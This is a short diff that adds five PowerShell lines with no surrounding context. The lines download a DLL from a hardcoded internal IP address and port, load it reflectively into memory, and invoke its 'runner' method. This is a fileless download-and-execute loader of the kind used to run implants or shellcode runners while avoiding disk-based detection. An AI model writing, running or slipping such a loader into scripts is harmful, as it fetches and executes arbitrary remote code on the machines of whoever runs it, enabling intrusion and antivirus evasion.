@@ -1,0 +1,5 @@
+    $data = (New-Object System.Net.WebClient).DownloadData('http://172.16.25.147:9090/ClassLibrary4311.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("ClassLibrary1.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
